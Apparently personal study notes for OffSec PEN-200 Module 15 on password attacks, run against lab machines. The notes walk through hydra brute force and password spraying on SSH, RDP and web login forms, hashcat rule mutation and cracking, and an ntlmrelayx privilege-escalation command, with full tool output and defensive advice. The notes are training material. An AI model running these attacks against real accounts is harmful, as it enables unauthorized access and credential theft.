---
title: "PEN-200 Module 15 \u2014 Password Attacks That Still Work"
slug: password-attacks
author: m4xx3d0ut
summary: Credential attacks blend automation with context. The lab notes captured
  wordlists, hashcat rule tweaks, and relay nuances; this revision makes them explicit.
publishedAt: '2023-09-29'
updatedAt: '2023-10-06'
readingMinutes: 84
tags:
- offsec
---
# PEN-200 Module 15 — Password Attacks That Still Work

## TLDR;

Credential attacks blend automation with context. The lab notes captured wordlists, hashcat rule tweaks, and relay nuances; this revision makes them explicit.

### Online Guessing

- Build user lists from LDAP, email headers, and OSINT; normalise casing and remove duplicates.
- Respect lockout thresholds: throttle attempts (`hydra -t 4 -W 30`) and log timings.

```
# SSH brute force with delays
hydra -L users.txt -P rockyou.txt -s 22 -V -W 15 ssh://192.168.119.37

# HTTP form spraying (Burp → Intruder capture first)
ffuf -X POST -d "username=FUZZ&password=Winter2024!" -H "Content-Type: application/x-www-form-urlencoded" -w users.txt -u https://portal.acme.local/login -mr "Welcome"
```

- Capture successes with timestamp, source IP, account type, and password reuse indicators.

### Hash Capture & Cracking

- Dump credentials responsibly (`secretsdump.py`, `impacket` relays, DPAPI extraction). Store raw files in encrypted containers.
- Use targeted wordlists plus rules:

```bash
hashcat -m 1000 hashes/ntlm.txt wordlists/rockyou.txt -r rules/dive.rule --session ntlm
hashcat -m 5600 hashes/netntlmv2.txt wordlists/top20k.txt -r rules/leetspeak.rule --status
```

- Leverage masks (`?u?l?l?l?d?d?d`) for seasonal patterns. Document masks used and cracked credentials for reporting.

### Relay & Pass-The-Hash

- **Responder / Inveigh** to capture Net-NTLMv2.
- **ntlmrelayx.py** to target SMB/HTTP services lacking signing or enforcing Extended Protection.

```bash
python3 ntlmrelayx.py -tf targets.txt -smb2support --escalate-user supportsvc
```

- After success, enumerate new privileges (`net localgroup administrators`, `Get-ADGroupMember`). Note lateral movement paths you unlocked.

### SSH Key & Password Manager Workflows

- Convert private keys: `ssh2john id_rsa > ssh.hash`, crack with `john --wordlist=... --rules=KoreLogic`.
- For KeePass/Password Safe artifacts, use `keepass2john` and mention key-file requirements in the notes.

### Operational Hygiene

- Segregate cracked credentials by sensitivity (user, service, privileged) and update the engagement tracker.
- Purge loot post-engagement per policy; document deletion commands for audit.

### Defensive Recommendations

- Enforce MFA, disable legacy auth protocols, and deploy account lockout alerting.
- Rotate captured credentials immediately; note whether the client already has PAM or SSPR solutions to support this.
- Roll out LAPS / gMSA to prevent local admin password reuse.

Module 15 proves passwords remain the weakest link—apply these workflows carefully, log everything, and hand defenders a prioritized remediation list.

## Working Notes... In Graphic Detail...

### Password Attacks

- Attacking network services logins.
- Password Cracking Fundamentals.
- Working with Password Hashes.

#### 15.1 Attacking Network Services Logins
 
- Attack SSH and RDP logins.
- Attack HTTP POST login forms.

##### SSH and RDP

- Execute a Dictionary attack against SSH and RDP.
 - Tool; THC Hydra.
	- Wordlist; `rockyou.txt`
  - Contains 14M passwords.

As an example we will brute our first test VM.  We will attack ssh on port 2222 and attempt to determine the password for the user `george`.

- Confirm the target is running SSH on port 2222.
```bash
┌──(operator㉿labhost)-[~/OffSec/password-attacks]
└─$ sudo nmap -sV -p 2222 192.168.241.201            
[sudo] password for operator: 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-30 09:12 PDT
Nmap scan report for 192.168.241.201
Host is up (0.079s latency).

PORT     STATE SERVICE VERSION
2222/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.68 seconds
```
- The output indicates that SSH is open.
- Let's assume through information gathering we already discovered the `george` user.
	- *The format of the user name may suggest that the company uses the first name for account names. This information can assist us later to further our efforts.
-  Once we have prepared the `rockyou.txt` by decompressing it.
	-  attack with a single username `-l george`
	-  specify the port with `-s 2222`
	-  set password list with `-P /usr/share/wordlists/rockyou.txt`
	-  define target with `ssh://192.168.241.201`
```bash
┌──(operator㉿labhost)-[~/OffSec/password-attacks]
└─$ hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.241.201
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-09-30 09:34:36
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://192.168.241.201:2222/
[2222][ssh] host: 192.168.241.201   login: george   password: chocolate
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-09-30 09:34:46
```
- We have successfully discovered a valid login for `george`
- The dictionary attack worked because the password was contained in the `rockyou.txt` wordlist.
- If we don't have a valid username.
 - We would use enumeration and information gathering techniques.
 - We can also attack built in accounts.
  - On Linux `root`
  - On Win `Administrator`

In the next example we will use the **password spraying** technique to use a single password against multiple usernames.
*This technique is extremely viable due to the number of ways we can gain access to passwords.  We may gain access to credentials using one of the techniques described later in this module, find the stored in plain text, or through online leak DBs.  Services like ScatteredSecrets track password leaks, compromise, and sell plaintext passwords.  This can be beneficial during a pentest, but we must assure we don't violate the ToS of these services and only use passwords in cooperation with the legal owner.  Always review the service to determine if it is operating legally.  As an example, WeLeakInfo was recently seized by the FBI and US DoJ for alleged illegal activity.

- We will demonstrate this by executing a password spray against out second test VM.
- Using `hydra`
 - Set the list of usernames `-L /usr/share/wordlists/dirb/others/names.txt`
  - Contains over 8000 usernames.
 - Set single password `-p "SuperS3cure1337#"`
 - Using RDP proto `rdp://192.168.241.202`
```bash
┌──(operator㉿labhost)-[~/OffSec/password-attacks]
└─$ hydra -L name.lst -p "SuperS3cure1337#" rdp://192.168.241.202 
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-09-30 13:35:00
[WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
[INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)
[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 2 tasks per 1 server, overall 2 tasks, 2 login tries (l:2/p:1), ~1 try per task
[DATA] attacking rdp://192.168.241.202:3389/
[3389][rdp] host: 192.168.241.202   login: daniel   password: SuperS3cure1337#
[3389][rdp] host: 192.168.241.202   login: justin   password: SuperS3cure1337#
1 of 1 target successfully completed, 2 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-09-30 13:35:12
```
- In this case we discover two usernames with the password we discovered in the DB leak.
- This can reveal users with the same password across multiple systems.
- We should always try to leverage every password we discover by spraying them across target systems.
 - Always use caution with broad-range attacks.
 - Dict attacks generate a lot of noise.
 - Huge amounts of traffic can bring down a network.
 - Basic brute force protection programs can lock user accounts after 3 attempts.
  - Possibly locking users out of critical production systems IRL pentest.


##### HTTP POST Login Form

During most assessments we will face a web service, often requiring login before we can interact.  If this is the only present vector and default creds fail, we should consider a dict attack.

Most web services have a default user account, i.e. `admin`, which we can use in the dict attack to increase our odds of success while also reducing attack duration.

In this example, we will perform a dict attack on the login form of a TinyFileManager app.

- Start with the app docs.
 - TinyFileManager.
  - Includes 2 def user accounts.
			- `admin`
			- `user`
- We will target `user` with the `rockyou.txt` wordlist using `hydra`
 - To target HTTP POST with Hydra we need 2 pieces of info.
  - The POST data.
   - Containing the request body which specifies username and password.
		- We must also capture a failed login attempt so Hydra can differentiate between successful and failed login attempts.
- Use Burp to intercept a login attempt.
 - Record the request body in the POST data.
```http
POST / HTTP/1.1
Host: 192.168.241.201
Content-Length: 23
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.241.201
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.141 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.241.201/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: filemanager=u1k19t8td1q7fsbpmjjb91g6a5
Connection: close

fm_usr=test&fm_pwd=test
```
- POST data.
	- `fm_usr=test&fm_pwd=test`
- We find a text string that appears in a failed login attempt GET.
	- `Login failed. Invalid username or password`
 - *In more complex web applications, we may need to dig deeper into the request and response or even inspect the source code of the login form to isolate a failed login indicator, but this is out of the scope of this Module.*.
- Now we can set the options of our Hydra attack.
 - Set user `-l`
 - Set wordlist `-P`
 - Set target IP without protocol.
	- POST form arg `http-post-form`
  - Accepts 3 colon-delimited fields.
			- Location of login form `index.php`
   - Request body providing username and password.
   - Failed login identifier aka the **condition string**.
    - The condition string is searched for in the response.
    - Try to avoid keywords like `password` or `username`
     - Modify the condition string as needed.
- Launch our Hydra attack.
```bash
┌──(operator㉿labhost)-[~/OffSec/password-attacks]
└─$ hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.241.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-09-30 18:34:55
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://192.168.241.201:80/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid
[STATUS] 66.00 tries/min, 66 tries in 00:01h, 14344333 to do in 3622:19h, 16 active
[80][http-post-form] host: 192.168.241.201   login: user   password: 121212
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-09-30 18:37:21
```
- Our attack was succesful.
 - Password of `user` is `121212`
 - We can confirm by logging in.
- Always be aware *dict attacks make a lot of noise!*.
 - If present, a WAF would block.
 - Other brute force mitigations would as well.
  - Fail2ban.
	- This is a highly effective vector, as web apps are no often protected with such measures.

Dict attacks can be highly effective if we begin with known info and take possible countermeasures into consideration.

###### Excersizes

The web page on VM #2 is password protected. Use Hydra to perform a password attack and get access as user admin. Once you have identified the correct password, enter it as answer to this exercise.
```
# Enumerate the running web server

┌──(operator㉿labhost)-[~/OffSec/password-attacks]
└─$ sudo nmap -sV -p 80 192.168.241.201
[sudo] password for operator: 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-30 19:05 PDT
Nmap scan report for 192.168.241.201
Host is up (0.075s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41
Service Info: Host: 172.25.0.2

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.62 seconds


# Craft attack using http-get method for Apache HTTP GET basic authentication

┌──(operator㉿labhost)-[~/OffSec/password-attacks]
└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 80 -f 192.168.241.201 http-get /
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-09-30 19:12:50
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-get://192.168.241.201:80/
[80][http-get] host: 192.168.241.201   login: admin   password: 789456
[STATUS] attack finished for 192.168.241.201 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-09-30 19:12:54


# Log in using admin:789456 success!
```


#### 15.2 Password Cracking Fundamentals

- Understand the fundamentals of password cracking.
- Mutate wordlists.
- Explain the basic password cracking methodology.
- Attack password manager key files.
- Attack the passphrase of SSH private keys.

##### Introduction to Encryption, Hashes and Cracking

We will examine the difference between encryption and hash algorithms as well as discuss password cracking.  We will review two popular password cracking tools:
- [Hashcat](https://hashcat.net/hashcat/)
- [John the Ripper (JtR)](https://www.openwall.com/john/)
Finally we will calculate the time it takes to crack specific hashes!

**Encryption** is a two-way function.  Data is scrambled, i.e. encrypted, and unscrambled, i.e. decrypted with at least one key.  The encrypted data is known as [ciphertext](https://en.wikipedia.org/wiki/Ciphertext)

- [Symmetric Encryption](https://en.wikipedia.org/wiki/Symmetric-key_algorithm)
 - Use the same key for enc and dec.
  - To send a message to another person both sides need to know the key (password)
  - If the key is sent via unsecure channel, it can be intercepted.
   - In this case, the attacker can use a MitM attack to access the encrypted message between the two.
   - With an intercepted key and access to the encrypted message the attacker can decrypt and read.
   - This introduces risk as the comm sec is reliant on knowledge of the key, which must be known by both sides before starting the comm.
			- An example is [AES (Advanced Encryption Standard)](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard)
- [Asymmetric Encryption](https://en.wikipedia.org/wiki/Public-key_cryptography)
 - Uses distinct key pairs.
  - Private and public key.
 - To recieve a message the user shares their pub key with the comm partner.
  - The pub key is used for the comm partner to enc their message to the user.
  - Only the corresponding priv key can dec the message.
		- An example is [RSA (Rivest-Shamir-Adleman)](https://en.wikipedia.org/wiki/RSA_(cryptosystem))

**Hash**, or a digest, is the result of running var sized input data, such as a plaintext password, through a hash algorithm.
- [SHA1](https://en.wikipedia.org/wiki/SHA-1)
- [MD5](https://en.wikipedia.org/wiki/MD5)
The result is a fixed-len hexadecimal value which represents the original plaintext input.  Plaintext run through the same hash algo always produces the same hash, which is statistically unique.  The only exception being an extremely rare [hash collision](https://en.wikipedia.org/wiki/Hash_collision), where two input values result in the same hash value.

The majority of common hash algos, i.e. SHA1 and MD5, are cryptographic hash functions.  They are [one-way finctions](https://en.wikipedia.org/wiki/One-way_function), trivial to generate but prohibitively difficult to reverse to plaintext from the hash.  We will focus on cryptographic hash functions primarily.

Hashing is leveraged in infosec.  When a user registers an account and sets a password, the password is typically hashed and stored in a DB.  This prevents the site admin (or an attacker) from accessing the plaintext password.

During login, the supplied password is hashed and compared to the hash in the DB.  If the match, the password is correct.

App and user passwords are more often than not encrypted or hashed for protection.  To dec an enc password we need to determine the key used to enc.  To determine the plaintext of a hash we must run plaintext passwords through the hash algo and compare the returned hash to the target hash.  **Password cracking** attacks are typically performed on a dedicated system, it is time consuming and should run in parralell with other actions during a pentest.

Unlike dict attacks, password cracking is quiet, doesn not lock accounts by failed attempts, and is unaffected by countermeasures.

Example, if we gain access to a [SHA-256](https://en.wikipedia.org/wiki/SHA-2) password hash with value:
```5b11618c2e44027877d0cd0921ed166b9f176f50587fc91e7534dd2946db77d6
```
We can use `sha256sum` to hash password attempts and compare the results.  If we hash `secret` twice and `secret1`, using `echo -n` to strip the newline (which would be added to the string, modifying the hash) we can see that the two `secret` hashes are the same.  The `secret1` hash is completely different, despite the similar input, showing us that plaintext `secret1` is not associated with the first hash.
```bash
kali@kali:~$ echo -n "secret" | sha256sum
2bb80d537b1da3e38bd30361aa855686bde0eacd7162fef6a25fe97bf527a25b  -

kali@kali:~$ echo -n "secret" | sha256sum
2bb80d537b1da3e38bd30361aa855686bde0eacd7162fef6a25fe97bf527a25b  -

kali@kali:~$ echo -n "secret1" | sha256sum
5b11618c2e44027877d0cd0921ed166b9f176f50587fc91e7534dd2946db77d6  -
```
This is sufficient for us to understand the process, but unwieldy in execution.  There are tools available to us for streamlining the process, two of the most popular are:
- Hashcat.
 - Mainly GPU based tool.
  - Requires.
			- [OpenCL](https://en.wikipedia.org/wiki/OpenCL)
			- [CUDA](https://developer.nvidia.com/cuda-toolkit)
 - Also supports CPU.
- JtR.
 - CPU based tool.
 - Also supports GPU.
GPU cracking is much faster than CPU, since GPUs contain thousands of cores to distribute the workload.  Note that some slow hash algos, like [bcrypt](https://en.wikipedia.org/wiki/Bcrypt), work better on CPU.  Both tools are important to learn, they support different algos.

Before we begin, we can calculate the cracking time of various hashes by dividing the [keyspace](https://www.hypr.com/security-encyclopedia/key-space) with the hash rate.  The keyspace consists of the char set to the power of the len of the plaintext input.
- Keyspace example.
 - Lower-case latin: 26 chars.
 - Upper-case latin: 26 chars.
 - Numbers 0-9: 10 chars.
 - Result 62 variations for each plaintext char.
  - A 5 char password = 62^5 possible passwords.
   - 916132832 possibilities.
```bash
kali@kali:~$ echo -n "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789" | wc -c
62

kali@kali:~$ python3 -c "print(62**5)"
916132832
```
- Hashrate example.
 - How many calculations per second.
 - We can find this with Hashcats benchmark mode.
  - We will concentrate on MD5, SHA1, SHA-256 for this example.
```bash
┌──(operator㉿labhost)-[~/OffSec/password-attacks]
└─$ hashcat -b
hashcat (v6.2.6) starting in benchmark mode

Benchmarking uses hand-optimized kernel code by default.
You can use it in your cracking session by setting the -O option.
Note: Using optimized kernel code limits the maximum supported password length.
To disable the optimized kernel code in benchmark mode, use the -w option.

OpenCL API (OpenCL 3.0 PoCL 4.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.7, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: cpu-skylake-avx512-11th Gen Intel(R) Core(TM) i7-1185G7 @ 3.00GHz, 14844/29752 MB (4096 MB allocatable), 8MCU

Benchmark relevant options:
===========================
* --optimized-kernel-enable

-------------------
* Hash-Mode 0 (MD5)
-------------------

Speed.#1.........:  1358.8 MH/s (5.77ms) @ Accel:1024 Loops:1024 Thr:1 Vec:16

----------------------
* Hash-Mode 100 (SHA1)
----------------------

Speed.#1.........:   568.9 MH/s (14.51ms) @ Accel:1024 Loops:1024 Thr:1 Vec:16

---------------------------
* Hash-Mode 1400 (SHA2-256)
---------------------------

Speed.#1.........:   240.0 MH/s (34.80ms) @ Accel:1024 Loops:1024 Thr:1 Vec:16
```
- The values are in MH/s.
 - 1 MH/s == 1,000,000 hashes per second.
- We can run the benchmark on GPU.
```powershell
C:\Users\admin\Downloads\hashcat-6.2.5>hashcat.exe -b
hashcat (v6.2.5) starting in benchmark mode
...
* Device #1: NVIDIA GeForce RTX 3090, 23336/24575 MB, 82MCU

Benchmark relevant options:
===========================
* --optimized-kernel-enable

-------------------
* Hash-Mode 0 (MD5)
-------------------

Speed.#1.........: 68185.1 MH/s (39.99ms) @ Accel:256 Loops:1024 Thr:128 Vec:8

----------------------
* Hash-Mode 100 (SHA1)
----------------------

Speed.#1.........: 21528.2 MH/s (63.45ms) @ Accel:64 Loops:512 Thr:512 Vec:1

---------------------------
* Hash-Mode 1400 (SHA2-256)
---------------------------

Speed.#1.........:  9276.3 MH/s (73.85ms) @ Accel:16 Loops:1024 Thr:512 Vec:1
```
- Note the speed advantage of GPU.

- Calculate a SHA256 cracking time.
 - Keyspace 62^5 = 916,132,832.
 - Hashrate = X MH/s * 1,000,000.
 - Output in seconds.
```bash
┌──(operator㉿labhost)-[~/OffSec/password-attacks]
└─$ python                                
Python 3.11.4 (main, Jun  7 2023, 10:13:09) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> hacktop = 1000000 * 240
>>> print(hacktop)
240000000
>>> keyspace = 916132832
>>> print(keyspace / hacktop)
3.8172201333333335
>>> gpu = 1000000 * 9276.3
>>> print(gpu)
9276300000.0
>>> print(keyspace / gpu)
0.09876058687192092
```
- The calculations show we can calculate the entire keyspace of a 5 char password SHA256 in:
 - CPU: 3.8 seconds.
 - GPU: 0.1 seconds.
- If we scale this up to 8 and 10 char password SHA256.
```
>>> keyspace = 62**8
>>> print(keyspace / gpu)
23537.41314801117
>>> keyspace = 62**10
>>> print(keyspace / gpu)
90477816.14095493
```
- When converted from seconds the GPU will take.
 - 6.5 hours to calculate they keyspace of the 8 char password.
	- 2.8 years for the 10 char!
- Increasing password length, increases cracking time exponentially.

##### Mutating Wordlists

Strong password policies dictating min len, char derivations, special chars, and num vals have become prevalent in recent years.  Most passwords found in common word lists will not suffice.  When attacking a target with strong policy we need to prepare the wordlist for such situations.  Once option is to mutate the passwords.
- [rule-based attack](https://hashcat.net/wiki/doku.php?id=rule_based_attack)
 - Individual rules are implemented through rule functions.
  - Modify existing passwords contained in the wordlist.
 - An individual rule consists of one or more rule functions.
  - Multiple rule functions will often be used in each rule.
- To leverage we must craft a rule file.
 - Supplied to cracking tool.
 - Basic example.
  - Rule function that appends fixed chars to all passwords in a word list.
  - Modifies various chars.

*Note that is does increase the size of wordlists dramatically, good cracking hardware is important, most can handle passwords with less than 8 chars easily.*

For this example:
- Password policy.
 - Upper case letter.
 - Special char.
 - Num val.
- We can check the first 10 passwords of `rockyou.txt` to determine if they fit this requirement.
```bash
┌──(operator㉿labhost)-[~/OffSec/password-attacks]
└─$ head /usr/share/wordlists/rockyou.txt  
123456
12345
123456789
password
iloveyou
princess
1234567
rockyou
12345678
abc123
```
- None of the first 10 passwords comply to the policy.
 - We could use a rule function to mutate the passwords to fit the policy, but first we will familiarize with rule functions and how to use them on a basic example before applying to a complex wordlist.

- Copy the first 10 passwords of `rockyou.txt` to `demo.txt`
- Remove all number sequences which don't fit the password policy.
 - Use `sed`
 - Edit in place `-i`
 - Lines starting with 1 `^1`
 - Delete with `d`
```bash
┌──(operator㉿labhost)-[~/OffSec/password-attacks]
└─$ head /usr/share/wordlists/rockyou.txt > demo.txt
                                                                                         
┌──(operator㉿labhost)-[~/OffSec/password-attacks]
└─$ sed -i '/^1/d' demo.txt 
                                                                                         
┌──(operator㉿labhost)-[~/OffSec/password-attacks]
└─$ cat demo.txt 
password
iloveyou
princess
rockyou
abc123
```
- We now have 5 passwords that we will mutate to fit the policy.
- [Hashcat Wiki](https://hashcat.net/wiki/doku.php?id=rule_based_attack)
 - List of all rule functions with examples.
 - If we want to add a char.
  - `$` function appends.
  - `^` function prepends.
  - Both expect on char after the function.
   - Example, prepend 3 to every password in a file.
    - The rule function is `^3`
- When generating a password with a num val, many users simple at 1 to the end.
 - Therefore we will use rule function `$1` .
  - Create `demo.rule` with this function.
   - Escape the special char `$` to echo it correctly.
```bash
┌──(operator㉿labhost)-[~/OffSec/password-attacks]
└─$ echo \$1 > demo.rule
```
- Now we can use Hascat with our wordlist mutation.
 - Provide rule file with `-r`
 - And `--stdout` to display mutated passwords in debug mode.
```bash
┌──(operator㉿labhost)-[~/OffSec/password-attacks]
└─$ hashcat -r demo.rule --stdout demo.txt 
password1
iloveyou1
princess1
rockyou1
abc1231
```
- Now for the uppercase char policy req.
- When forced to use and upper case, many users capitalize the first letter.
 - Therefore we will use the `c` rule function to cap the first char and convert the rest to lower.
 - When using multiple rules.
  - If rules are on the same line sep by space.
   - Hashcat uses them consecutively on each password.
    - Resulting in cap first char and 1 appended.
  - If rules are on sep lines.
   - Hashcat will use each rule separately.
    - Resulting in two mutated passwords for each password in the list.
```bash
kali@kali:~/passwordattacks$ cat demo1.rule     
$1 c
       
kali@kali:~/passwordattacks$ hashcat -r demo1.rule --stdout demo.txt
Password1
Iloveyou1
Princess1
Rockyou1
Abc1231

kali@kali:~/passwordattacks$ cat demo2.rule   
$1
c

kali@kali:~/passwordattacks$ hashcat -r demo2.rule --stdout demo.txt
password1
Password
iloveyou1
Iloveyou
princess1
Princess
...
```
- Now to add the special char.
- We will start with `!`, a common special char.
 - Therefore we will add `$1` to our rule file.
```bash
┌──(operator㉿labhost)-[~/OffSec/password-attacks]
└─$ echo \$1 c \$! > demo1.rule
                                                                                         
┌──(operator㉿labhost)-[~/OffSec/password-attacks]
└─$ cat demo1.rule             
$1 c $!
```
- We will make two rule file variations.
```bash
┌──(operator㉿labhost)-[~/OffSec/password-attacks]
└─$ echo \$1 c \$! > demo1.rule
                                                                                         
┌──(operator㉿labhost)-[~/OffSec/password-attacks]
└─$ cat demo1.rule             
$1 c $!
                                                                                         
┌──(operator㉿labhost)-[~/OffSec/password-attacks]
└─$ echo \$! \$1 c > demo2.rule


┌──(operator㉿labhost)-[~/OffSec/password-attacks]
└─$ cat demo2.rule 
$! $1 c


┌──(operator㉿labhost)-[~/OffSec/password-attacks]
└─$ hashcat -r demo1.rule --stdout demo.txt
Password1!
Iloveyou1!
Princess1!
Rockyou1!
Abc1231!
                                                                                         
┌──(operator㉿labhost)-[~/OffSec/password-attacks]
└─$ hashcat -r demo2.rule --stdout demo.txt
Password!1
Iloveyou!1
Princess!1
Rockyou!1
Abc123!1
```

With this basic understanding, let's assume we have retrieved an MD%:
```bash
┌──(operator㉿labhost)-[~/OffSec/password-attacks]
└─$ echo -n "f621b6c9eab51a3e2f4e167fee4c6860" > crackme.txt
                                                                                         
┌──(operator㉿labhost)-[~/OffSec/password-attacks]
└─$ cat crackme.txt      
f621b6c9eab51a3e2f4e167fee4c6860 
```
- We will use `rockyout.txt`
- Modify for a policy including:
 - Upper case letter.
 - Numerical value.
 - Special char.
- Let's create out rule file, `demo3.rule`
 - Use `c` function to cap first char and lower the rest.
 - Append special char `$!`
 - For num, the ever-popular `123`
		- `$1 $2 $3`
  - Which we will follow with our special char.
```bash
┌──(operator㉿labhost)-[~/OffSec/password-attacks]
└─$ echo \$1 \$2 \$3 c \$! > demo3.rule 
                                                                                         
┌──(operator㉿labhost)-[~/OffSec/password-attacks]
└─$ cat demo3.rule 
$1 $2 $3 c $!
```
- We will run Hshcast without debugging.
 - Set the hash type to MD5 with `-m 0`
 - Then the target hash file `crackme.txt`
 - And the `rockyou.txt` wordlist.
 - Followed by `-r` and our rule file.
 - Ending with `--force` to ingnore Hashcat warnings.
```bash
┌──(operator㉿labhost)-[~/OffSec/password-attacks]
└─$ hashcat -m 0 crackme.txt /usr/share/wordlists/rockyou.txt -r demo3.rule --force
hashcat (v6.2.6) starting

...

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

f621b6c9eab51a3e2f4e167fee4c6860:Computer123!             
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: f621b6c9eab51a3e2f4e167fee4c6860
Time.Started.....: Sun Oct  1 08:44:29 2023, (0 secs)
Time.Estimated...: Sun Oct  1 08:44:29 2023, (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Mod........: Rules (demo3.rule)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  4489.6 kH/s (0.54ms) @ Accel:1024 Loops:1 Thr:1 Vec:16
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 8192/14344385 (0.06%)
Rejected.........: 0/8192 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 123456123! -> Whitetiger123!
Hardware.Mon.#1..: Temp: 39c Util: 12%

Started: Sun Oct  1 08:44:14 2023
Stopped: Sun Oct  1 08:44:30 2023
```
- In this case we recover `Computer123!`
 - Not included in the default `rockyou.txt`
 - It only took hashcat a few seconds on CPU.

**When attempting to create rules** to mutate and existing wordlist:
- Always consider human behavior and convenience regarding passwords.
- Most users, use a main word and modify it to fit a policy.
- Often appending numbers and special chars.
- When an upper case is req, most user cap the first char.
- When a special char is req, most users append it to the end.
 - Often relying on chars on the left side of the keyboard as they are easy to reach and type.

Instead of creating rules ourselves, we can also use rules provided by Hashcat and other sources.  Hashcat includes a variety of rules in `/usr/share/hashcat/rules`.
```bash
┌──(operator㉿labhost)-[~/OffSec/password-attacks]
└─$ ls /usr/share/hashcat/rules        
best64.rule                  T0XlC_3_rule.rule
combinator.rule              T0XlC-insert_00-99_1950-2050_toprules_0_F.rule
d3ad0ne.rule                 T0XlC_insert_HTML_entities_0_Z.rule
dive.rule                    T0XlC-insert_space_and_special_0_F.rule
generated2.rule              T0XlC-insert_top_100_passwords_1_G.rule
generated.rule               T0XlC.rule
hybrid                       T0XlCv2.rule
Incisive-leetspeak.rule      toggles1.rule
InsidePro-HashManager.rule   toggles2.rule
InsidePro-PasswordsPro.rule  toggles3.rule
leetspeak.rule               toggles4.rule
oscommerce.rule              toggles5.rule
rockyou-30000.rule           unix-ninja-leetspeak.rule
specific.rule
```
- The cover a wide range of mutations.
 - Most useful when we don't know the target's password policy.
 - We will use predefined rules in upcoming examples.
- It's always most efficient to gain information about the target password policy or find typically used default policies for the target software env.

##### Password Manager

Password managers create and store passwords for different services and protect them with a master password.  The master password grants access to all creds held in the manager.  Users often copy-paste from the manager or use auto-fill browser function.
- Popular managers:
	- [1Password](https://1password.com/)
	- [KeePass](https://keepass.info/)
- Software of this type can assist users who must maintain many, complex, passwords.
 - It can also introduce risk.

We will demonstrate a common pentest scenario, where we have gained access to a client workstation running a passman.  We will:
- Extract the passman DB.
- Transform the file into Hashcat usable format.
- Crack the master DB pass.

Begin by connecting to SALESWK01 lab machine via RDP, assuming we have obtained the credentials, and gain access to the desktop.  Once connected:
- Check installed programs.
 - Since we have GUI, use "Apps & Features" Win function.
  - Win icon.
  - Apps.
  - Add or remove.
  - Then scroll the list to review installed programs.
